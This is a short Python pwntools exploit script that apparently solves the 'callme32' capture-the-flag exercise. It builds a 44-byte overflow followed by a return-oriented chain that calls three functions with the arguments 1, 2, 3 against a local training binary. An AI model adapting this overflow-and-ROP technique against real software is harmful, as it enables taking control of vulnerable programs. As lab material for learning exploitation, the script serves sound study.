#!/usr/bin/python
from pwn import *

def main():
    junk = "A" * 44                     # EIP Offset at 44
    callone_addr = p32(0x80485c0)       # objdump -d callme32 | grep callme_one
    calltwo_addr = p32(0x8048620)       # objdump -d callme32 | grep callme_two
    callthree_addr = p32(0x80485b0)     # objdump -d callme32 | grep callme_one
    rop_chains = p32(0x080488a9)        # pop esi ; pop edi ; pop ebp ; ret
    args = p32(1) + p32(2) + p32(3)
    p = process("./callme32")
    payload = junk + callone_addr + rop_chains + args + calltwo_addr + rop_chains + args + callthree_addr + rop_chains + args

    p.sendlineafter(">", payload)
    print p.recvall()

if __name__ == "__main__":
    main()
